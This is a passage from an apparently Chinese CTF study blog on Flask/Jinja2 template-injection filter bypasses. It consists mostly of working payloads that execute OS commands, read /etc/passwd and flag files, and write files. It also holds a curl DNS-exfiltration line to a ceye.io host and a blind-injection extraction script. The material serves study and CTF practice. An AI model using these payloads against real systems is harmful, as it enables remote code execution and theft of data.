class="headerlink" title="过滤了小括号"></a>过滤了小括号</h3><p>用python的内置函数</p><ul><li>get_flashed_messages()</li><li>url_for()</li></ul><p>payload</p><pre><code class="python">&#123;&#123;url_for.__globals__&#125;&#125;&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;1234</code></pre><h4 id="过滤了-class、-subclasses、-read等关键词"><a href="#过滤了-class、-subclasses、-read等关键词" class="headerlink" title="过滤了 class、 subclasses、 read等关键词"></a>过滤了 <code>class</code>、 <code>subclasses</code>、 <code>read</code>等关键词</h4><p>用request</p><ul><li>GET: request.args</li><li>Cookies: request.cookies</li><li>Headers: request.headers</li><li>Environment: request.environ</li><li>Values: request.values</li></ul><p>一些用法</p><ul><li><code>request.__class__</code></li><li><code>request[&quot;__class__&quot;]</code></li><li><code>request|attr(&quot;__class__&quot;)</code></li></ul><p>payload</p><pre><code class="python">&#123;&#123;''[request.args.a][request.args.b][2][request.args.c]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__1</code></pre><h4 id="过滤了下划线"><a href="#过滤了下划线" class="headerlink" title="过滤了下划线_"></a>过滤了下划线<code>_</code></h4><p>payload</p><pre><code class="python">&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;&amp;class=class&amp;usc=_</code></pre><p>其实现过程如下</p><pre><code class="python">&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;&#123;&#123;request|attr(["_"*2,"class","_"*2]|join)&#125;&#125;&#123;&#123;request|attr(["__","class","__"]|join)&#125;&#125;&#123;&#123;request|attr("__class__")&#125;&#125;&#123;&#123;request.__class__&#125;&#125;</code></pre><h4 id="过滤了中括号-和"><a href="#过滤了中括号-和" class="headerlink" title="过滤了中括号[和]"></a>过滤了中括号<code>[</code>和<code>]</code></h4><p>payload</p><pre><code class="python">&#123;&#123;request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)&#125;&#125;&amp;class=class&amp;usc=_&#123;&#123;request|attr(request.args.getlist(request.args.l)|join)&#125;&#125;&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_12</code></pre><h4 id="过滤了-join"><a href="#过滤了-join" class="headerlink" title="过滤了|join"></a>过滤了<code>|join</code></h4><p>用<code>|format</code>    payload</p><pre><code class="python">&#123;&#123;request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))&#125;&#125;&amp;f=%s%sclass%s%s&amp;a=_1</code></pre><h4 id="无敌绕过的最终RCE"><a href="#无敌绕过的最终RCE" class="headerlink" title="无敌绕过的最终RCE"></a>无敌绕过的最终RCE</h4><p>绕过<code>[</code>，<code>]</code>检查，但不绕过<code>__</code>检查<br> 使用该<code>set</code>函数来访问必需的<code>object（i）</code>类<br> <code>pop()</code>将检索file对象，然后使用我们的已知参数调用该对象<br> 与初始RCE相似，这将创建一个python文件<code>/tmp/foo.py</code>并执行<code>print 1337</code>有效负载</p><pre><code class="python">&#123;%set%20a,b,c,d,e,f,g,h,i%20=%20request.__class__.__mro__%&#125;&#123;&#123;i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;file=/tmp/foo.py&amp;write=w&amp;payload=print+1337</code></pre><p>绕过所有的rce</p><pre><code class="python">&#123;%set%20a,b,c,d,e,f,g,h,i%20=%20request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.mro,request.args.usc*2)|join)%&#125;&#123;&#123;(i|attr((request.args.usc*2,request.args.subc,request.args.usc*2)|join)()).pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;class=class&amp;mro=mro&amp;subc=subclasses&amp;usc=_&amp;file=/tmp/foo.py&amp;write=w&amp;payload=print+1337</code></pre><h1 id="python2的方法"><a href="#python2的方法" class="headerlink" title="python2的方法"></a><strong>python2的方法</strong></h1><p>因为python3和python2两个版本下有差别，这里把python2单独拿出来说</p><p>tips：python2的string类型不直接从属于属于基类，所以要用两次 <strong>bases</strong>[0]</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/97cd39ea2aec44709fc68929a10ed2ea.jpeg" alt="img"></p><ul><li>file类读写文件</li></ul><p>本方法只能适用于python2，因为在python3中file类已经被移除了</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/a9d24ae5c1bd41359cfba6666b1f6228.png" alt="img"></p><p>可以使用dir查看file对象中的内置方法</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p><pre><code>&gt;&gt;&gt; dir(().__class__.__bases__[0].__subclasses__()[40])[&#39;__class__&#39;, &#39;__delattr__&#39;, &#39;__doc__&#39;, &#39;__enter__&#39;, &#39;__exit__&#39;, &#39;__format__&#39;, &#39;__getattribute__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__iter__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;close&#39;, &#39;closed&#39;, &#39;encoding&#39;, &#39;errors&#39;, &#39;fileno&#39;, &#39;flush&#39;, &#39;isatty&#39;, &#39;mode&#39;, &#39;name&#39;, &#39;newlines&#39;, &#39;next&#39;, &#39;read&#39;, &#39;readinto&#39;, &#39;readline&#39;, &#39;readlines&#39;, &#39;seek&#39;, &#39;softspace&#39;, &#39;tell&#39;, &#39;truncate&#39;, &#39;write&#39;, &#39;writelines&#39;, &#39;xreadlines&#39;]</code></pre><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p><p>然后直接调用里面的方法即可，payload如下</p><p>读文件</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines()&#125;&#125;</code></pre><ul><li>warnings类中的linecache</li></ul><p>本方法只能用于python2，因为在python3中会报错’function object’ has no attribute ‘func_globals’，猜测应该是python3中func_globals被移除了还是啥的，如果不对请师傅们指出</p><p>我们把上面的find.py脚本中的search变量赋值为linecache，去寻找含有linecache的类</p><pre><code>λ python find.py(&lt;class &#39;warnings.WarningMessage&#39;&gt;, 59)(&lt;class &#39;warnings.catch_warnings&#39;&gt;, 60)</code></pre><p>后面如法炮制，payload如下</p><pre><code>&#123;&#123;[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].os.popen('whoami').read()&#125;&#125;</code></pre><p><strong>python2&amp;3的方法</strong></p><p>这里介绍python2和python3两个版本通用的方法</p><ul><li>__builtins__代码执行</li></ul><p>这种方法是比较常用的，因为他两种python版本都适用</p><p>首先__builtins__是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__builtins__这类模块在Python启动时为我们导入了，可以使用dir(<strong>builtins</strong>)来查看调用方法的列表，然后可以发现__builtins__下有eval，__import__等的函数，因此可以利用此来执行命令。</p><p>把上面find.py脚本search变量赋值为__builtins__，然后找到第140个类warnings.catch_warnings含有他，而且这里的话比较多的类都含有__builtins__，比如常用的还有email.header._ValueFormatter等等，这也可能是为什么这种方法比较多人用的原因之一吧</p><p>再调用eval等函数和方法即可，payload如下</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;</code></pre><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p><p>又或者用如下两种方式，用模板来跑循环</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p><pre><code>&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/f45931bb692441b6b6040aa863eaf12c.png" alt="img"></p><p>读取文件payload</p><pre><code>&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>另外一些绕过方法:</p><p><strong>绕过黑名单</strong></p><p>CTF中一般考的就是怎么绕过SSTI，我们学会如何去构造payload之后，还要学习如何去绕过一些过滤，然后下面由于环境的不同，payload中类的位置也是就那个数字可能会和文章中不一样，需要自己动手测一下</p><p><strong>过滤了点</strong></p><p>过滤了.</p><p>在python中，可用以下表示法可用于访问对象的属性</p><pre><code>&#123;&#123;().__class__&#125;&#125;&#123;&#123;()["__class__"]&#125;&#125;&#123;&#123;()|attr("__class__")&#125;&#125;&#123;&#123;getattr('',"__class__")&#125;&#125;</code></pre><p>也就是说我们可以通过[]，attr()，getattr()来绕过点</p><ul><li>使用[]绕过</li></ul><p>使用访问字典的方式来访问函数或者类等，下面两行是等价的</p><pre><code>&#123;&#123;().__class__&#125;&#125;&#123;&#123;()['__class__']&#125;&#125;</code></pre><p>以此，我们可以构造payload如下</p><pre><code>&#123;&#123;()['__class__']['__base__']['__subclasses__']()[433]['__init__']['__globals__']['popen']('whoami')['read']()&#125;&#125;</code></pre><ul><li>使用attr()绕过</li></ul><p>使用原生JinJa2的函数attr()，以下两行是等价的</p><pre><code>&#123;&#123;().__class__&#125;&#125;&#123;&#123;()|attr('__class__')&#125;&#125;</code></pre><p>以此，我们可以构造payload如下</p><pre><code>&#123;&#123;()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(65)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("whoami").read()')&#125;&#125;</code></pre><ul><li>使用getattr()绕过</li></ul><p>这种方法有时候由于环境问题不一定可行，会报错’getattr’ is undefined，所以优先使用以上两种</p><pre><code>Python 3.7.8&gt;&gt;&gt; ().__class__&lt;class &#39;tuple&#39;&gt;&gt;&gt;&gt; getattr((),&quot;__class__&quot;)&lt;class &#39;tuple&#39;&gt;</code></pre><p><strong>过滤引号</strong></p><p>过滤了’和”</p><ul><li>request绕过</li></ul><p>flask中存在着request内置对象可以得到请求的信息，request可以用5种不同的方式来请求信息，我们可以利用他来传递参数绕过</p><pre><code>request.args.namerequest.cookies.namerequest.headers.namerequest.values.namerequest.form.name</code></pre><p>payload如下</p><p>GET方式，利用request.args传递参数</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd</code></pre><p>POST方式，利用request.values传递参数</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;post:arg1=open&amp;arg2=/etc/passwd</code></pre><p>Cookie方式，利用request.cookies传递参数</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;Cookie:arg1=open;arg2=/etc/passwd</code></pre><p>剩下两种方法也差不多，这里就不赘述了</p><ul><li>chr绕过</li></ul><pre><code>&#123;&#123;().__class__.__base__.__subclasses__()[§0§].__init__.__globals__.__builtins__.chr&#125;&#125;</code></pre><p>这里先爆破subclasses，获取subclasses中含有chr的类索引</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/ce9a23785e014adda7f75ca7c05d5c33.jpeg" alt="img"></p><p>然后就可以用chr来绕过传参时所需要的引号，然后需要用chr来构造需要的字符</p><p>这里我写了个脚本可以快速构造想要的ascii字符</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p><pre><code>&lt;?php$a = &#39;whoami&#39;;$result = &#39;&#39;;for($i=0;$i&lt;strlen($a);$i++)&#123; $result .= &#39;chr(&#39;.ord($a[$i]).&#39;)%2b&#39;;&#125;echo substr($result,0,-3);?&gt;//chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)</code></pre><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p><p>最后payload如下</p><pre><code>&#123;% set chr = ().__class__.__base__.__subclasses__()[7].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[257].__init__.__globals__.popen(chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read()&#125;&#125;</code></pre><p><strong>过滤下划线</strong></p><p>过滤了_</p><ul><li>编码绕过</li></ul><p>使用十六进制编码绕过，_编码后为\x5f，.编码后为\x2E</p><p>payload如下</p><pre><code>&#123;&#123;()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[376]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]['popen']('whoami')['read']()&#125;&#125;</code></pre><p>这里甚至可以全十六进制绕过，顺便把关键字也一起绕过，这里先给出个python脚本方便转换</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p><pre><code>string1=&quot;__class__&quot;string2=&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;def tohex(string):  result = &quot;&quot;  for i in range(len(string)):      result=result+&quot;\\x&quot;+hex(ord(string[i]))[2:]  print(result)tohex(string1) #\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5fprint(string2) #__class__</code></pre><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p><p>随便构造个payload如下</p><pre><code>&#123;&#123;""["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x62\x61\x73\x65\x5f\x5f"]["\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f"]()[64]["\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"]["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]["\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f"]["\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f"]("\x6f\x73")["\x70\x6f\x70\x65\x6e"]("whoami")["\x72\x65\x61\x64"]()&#125;&#125;</code></pre><ul><li>request绕过</li></ul><p>在上面的过滤引号已经介绍过了，这里不再赘述</p><p><strong>过滤关键字</strong></p><p>首先要看关键字是如何被过滤的</p><p>如果是替换为空，可以尝试双写绕过，或者使用黑名单逻辑漏洞错误绕过，即使用黑名单最后一个关键字替换绕过</p><p>如果直接ban了，就可以使用字符串拼接的方式等方法进行绕过，常用方法如下</p><ul><li>拼接字符绕过</li></ul><p>这里以过滤class为例子，用中括号括起来然后里面用引号连接，可以用+号或者不用</p><pre><code>&#123;&#123;()['__cla'+'ss__'].__bases__[0]&#125;&#125;&#123;&#123;()['__cla''ss__'].__bases__[0]&#125;&#125;</code></pre><p>随便写个payload如下</p><pre><code>&#123;&#123;()['__cla''ss__'].__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['ev''al']("__im""port__('o''s').po""pen('whoami').read()")&#125;&#125;</code></pre><p>或者可以使用join来进行拼接</p><pre><code>&#123;&#123;()|attr(["_"*2,"cla","ss","_"*2]|join)&#125;&#125;</code></pre><p>看到有师傅甚至用管道符加上format方法来拼接的骚操作，也就是我们平时说的格式化字符串，其中的%s被l替换</p><pre><code>&#123;&#123;()|attr(request.args.f|format(request.args.a))&#125;&#125;&amp;f=__c%sass__&amp;a=l</code></pre><ul><li>使用使用str原生函数</li></ul><p>replace绕过，payload如下</p><pre><code>&#123;&#123;().__getattribute__('__claAss__'.replace("A","")).__bases__[0].__subclasses__()[376].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>decode绕过，但这种方法经过测试只能在python2下使用，payload如下</p><pre><code>&#123;&#123;().__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()&#125;&#125;</code></pre><ul><li>替代的方法</li></ul><p>过滤init，可以用__enter__或__exit__替代</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;</code></pre><p>过滤config，我们通常会用获取当前设置，如果被过滤了可以使用以下的payload绕过</p><pre><code>&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;</code></pre><p><strong>过滤中括号</strong></p><p>过滤了[和]</p><ul><li>数字中的中括号</li></ul><p>在python里面可以使用以下方法访问数组元素</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p><pre><code>Python 3.7.8&gt;&gt;&gt; [&quot;a&quot;,&quot;kawhi&quot;,&quot;c&quot;][1]&#39;kawhi&#39;&gt;&gt;&gt; [&quot;a&quot;,&quot;kawhi&quot;,&quot;c&quot;].pop(1)&#39;kawhi&#39;&gt;&gt;&gt; [&quot;a&quot;,&quot;kawhi&quot;,&quot;c&quot;].__getitem__(1)&#39;kawhi&#39;</code></pre><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p><p>也就是说可以使用__getitem__和pop替代中括号，取列表的第n位</p><p>payload如下</p><pre><code>&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(433).__init__.__globals__.popen('whoami').read()&#125;&#123;&#123;().__class__.__base__.__subclasses__().pop(433).__init__.__globals__.popen('whoami').read()&#125;&#125;</code></pre><ul><li>魔术方法的中括号</li></ul><p>调用魔术方法本来是不用中括号的，但是如果过滤了关键字，要进行拼接的话就不可避免要用到中括号，像这里如果同时过滤了class和中括号</p><p>可用__getattribute__绕过</p><pre><code>&#123;&#123;"".__getattribute__("__cla"+"ss__").__base__&#125;&#125;</code></pre><p>或者可以配合request一起使用</p><pre><code>&#123;&#123;().__getattribute__(request.args.arg1).__base__&#125;&#125;&amp;arg1=__class__</code></pre><p>payload如下</p><pre><code>&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(376).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami</code></pre><p>这种同样是绕过关键字的方法之一</p><p><strong>过滤双大括号</strong></p><p>过滤了</p><ul><li>使用dns外带数据</li></ul><pre><code class="python">用&#123;%%&#125;替代了&#123;&#123;&#125;&#125;，使用判断语句进行dns外带数据``````&#123;% if ().__class__.__base__.__subclasses__()[433].__init__.__globals__['popen']("curl `whoami`.k1o75b.ceye.io").read()=='kawhi' %&#125;1&#123;% endif %&#125;```然后在ceye平台接收数据即可![img](ssti-flak框架/a0b1acecc5844f778d857c94da232d74.jpeg)- 盲注如果上面的方法不行的话，可以考虑使用盲注的方式，这里附上p0师傅的脚本[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)```# -*- coding: utf-8 -*-import requestsurl = 'http://ip:5000/?name='def check(payload):    r = requests.get(url+payload).content    return 'kawhi' in rpassword  = ''s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;<=>?@[\\]^`&#123;|&#125;~\'"_%'for i in xrange(0,100):    for c in s:        payload = '&#123;% if ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__.open("/etc/passwd").read()['+str(i)+':'+str(i+1)+'] == "'+c+'" %&#125;kawhi&#123;% endif %&#125;'        if check(payload):            password += c            break    print password```[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)- print标记我们上面之所以要dnslog外带数据以及使用盲注，是因为用&#123;%%&#125;会没有回显，这里的话可以使用print来做一个标记使得他有回显，比如&#123;%print config%&#125;，payload如下```&#123;%print ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")%&#125;```**payload进阶与拓展**这里我基于上面绕过黑名单各种方法的组合，对CTF中用到的一些方法和payload再做一个小的总结，不过其实一般来说，只要不是太偏太绕的题，上面的方法自行组合一下都够用了，下面只是作为一个拓展**过滤_和.和'**这里顺便给一个不常见的方法，主要是找到_frozen_importlib_external.FileLoader的get_data()方法，第一个是参数0，第二个为要读取的文件名，payload如下```&#123;&#123;().__class__.__bases__[0].__subclasses__()[222].get_data(0,"app.py")&#125;&#125;```使用十六进制绕过后，payload如下```&#123;&#123;()["\x5f\x5fclass\x5f\x5f"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[222]["get\x5Fdata"](0, "app\x2Epy")&#125;&#125;```**过滤args和.和_**之前某二月赛在y1ng师傅博客看到的一个payload，原理并不难，这里使用了attr()绕过点，values绕过args，payload如下[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)```&#123;&#123;()|attr(request['values']['x1'])|attr(request['values']['x2'])|attr(request['values']['x3'])()|attr(request['values']['x4'])(40)|attr(request['values']['x5'])|attr(request['values']['x6'])|attr(request['values']['x4'])(request['values']['x7'])|attr(request['values']['x4'])(request['values']['x8'])(request['values']['x9'])&#125;&#125;post:x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('whoami').read()```[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)**导入主函数读取变量**有一些题目我们不并需要去getshell，比如flag直接暴露在变量里面了，像如下这样把/flag文件加载到flag这个变量里面了```f = open('/flag','r')flag = f.read()```我们就可以通过import是导入__main__主函数去读变量，payload如下```&#123;%print request.application.__globals__.__getitem__('__builtins__').__getitem__('__import__')('__main__').flag %&#125;</=></code></pre><p><strong>Unicode绕过</strong></p><p>这种方法是从安洵杯2020 官方Writeup学到的，我们直奔主题看payload</p><pre><code>&#123;%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22))|attr(%22\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)()%&#125;</code></pre><pre><code>这里的print绕过&#123;&#123;&#125;&#125;和attr绕过.上面已经说过了这里不赘述然后这里的lipsum用&#123;&#123;lipsum&#125;&#125;测了一下发现是个方法&lt;function generate_lorem_ipsum at 0x7fcddfa296a8&gt;</code></pre><p>然后用他直接调用__globals__发现可以直接执行os命令，测了一下发现__builtins__也可以用，又学到了一种新方法，只能说师傅们tql</p><pre><code>&#123;&#123;lipsum.__globals__['os'].popen('whoami').read()&#125;&#125;&#123;&#123;lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;</code></pre><p>回到正题，这里使用了Unicode编码绕过关键字，下面两行是等价的</p><pre><code>&#123;&#123;()|attr("__class__")&#125;&#125;&#123;&#123;()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")&#125;&#125;</code></pre><p>知道了这两点之后，那个官方给的payload就很明朗了，解开编码后如下</p><pre><code>&#123;%print(lipsum|attr("__globals__"))|attr("__getitem__")("os")|attr("popen")("whoami")|attr("read")()%&#125;</code></pre><p>然后我这里顺便给个Unicode互转的php脚本</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p><pre><code>&lt;?php//字符串转Unicode编码function unicode_encode($strLong) &#123;  $strArr = preg_split(&#39;/(?&lt;!^)(?!$)/u&#39;, $strLong);//拆分字符串为数组(含中文字符)  $resUnicode = &#39;&#39;;  foreach ($strArr as $str)  &#123;      $bin_str = &#39;&#39;;      $arr = is_array($str) ? $str : str_split($str);//获取字符内部数组表示,此时$arr应类似array(228, 189, 160)      foreach ($arr as $value)      &#123;          $bin_str .= decbin(ord($value));//转成数字再转成二进制字符串,$bin_str应类似111001001011110110100000,如果是汉字&quot;你&quot;      &#125;      $bin_str = preg_replace(&#39;/^.&#123;4&#125;(.&#123;4&#125;).&#123;2&#125;(.&#123;6&#125;).&#123;2&#125;(.&#123;6&#125;)$/&#39;, &#39;$1$2$3&#39;, $bin_str);//正则截取, $bin_str应类似0100111101100000,如果是汉字&quot;你&quot;      $unicode = dechex(bindec($bin_str));//返回unicode十六进制      $_sup = &#39;&#39;;      for ($i = 0; $i &lt; 4 - strlen($unicode); $i++)      &#123;          $_sup .= &#39;0&#39;;//补位高字节 0      &#125;      $str =  &#39;\\u&#39; . $_sup . $unicode; //加上 \u  返回      $resUnicode .= $str;  &#125;  return $resUnicode;&#125;//Unicode编码转字符串方法1function unicode_decode($name)&#123;  // 转换编码，将Unicode编码转换成可以浏览的utf-8编码  $pattern = &#39;/([\w]+)|(\\\u([\w]&#123;4&#125;))/i&#39;;  preg_match_all($pattern, $name, $matches);  if (!empty($matches))  &#123;    $name = &#39;&#39;;    for ($j = 0; $j &lt; count($matches[0]); $j++)    &#123;      $str = $matches[0][$j];      if (strpos($str, &#39;\\u&#39;) === 0)      &#123;        $code = base_convert(substr($str, 2, 2), 16, 10);        $code2 = base_convert(substr($str, 4), 16, 10);        $c = chr($code).chr($code2);        $c = iconv(&#39;UCS-2&#39;, &#39;UTF-8&#39;, $c);        $name .= $c;      &#125;      else      &#123;        $name .= $str;      &#125;    &#125;  &#125;  return $name;&#125;//Unicode编码转字符串function unicode_decode2($str)&#123;  $json = &#39;&#123;&quot;str&quot;:&quot;&#39; . $str . &#39;&quot;&#125;&#39;;  $arr = json_decode($json, true);  if (empty($arr)) return &#39;&#39;;  return $arr[&#39;str&#39;];&#125;echo unicode_encode(&#39;__class__&#39;);echo unicode_decode(&#39;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#39;);//\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f__class__</code></pre><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p><h1 id="魔改字符"><a href="#魔改字符" class="headerlink" title="魔改字符"></a><strong>魔改字符</strong></h1><pre><code>这种方法是在太湖杯easyWeb这道题目学到的，上面所说的过滤双大括号，在一些特定的题目可以魔改&#123;&#123;&#125;&#125;，比如说这道题由于有个字符规范器可以把我们输入的文本标准化，所以可以使用这种方法```![img](ssti-flak框架/99b07c77bc934233b53852378b18075d.jpeg)可以在Unicode字符网站寻找绕过的字符，直接在网址搜索&#123;，就会出现类似的字符，就可以找到︷和︸了，网址：https://www.compart.com/en/unicode/U+FE38payload如下```︷︷config︸︸%EF%B8%B7%EF%B8%B7config%EF%B8%B8%EF%B8%B8```还可以使用中文的字符魔改[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)```｛ &#65371;｝ &#65373;［ &#65339;］ &#65341;＇ &#65287;＂ &#65282;payload如下｛｛url_for.__globals__［＇__builtins__＇］［＇eval＇］（＇__import__（＂os＂）.popen（＂cat /flag＂）.read（）＇）｝｝ 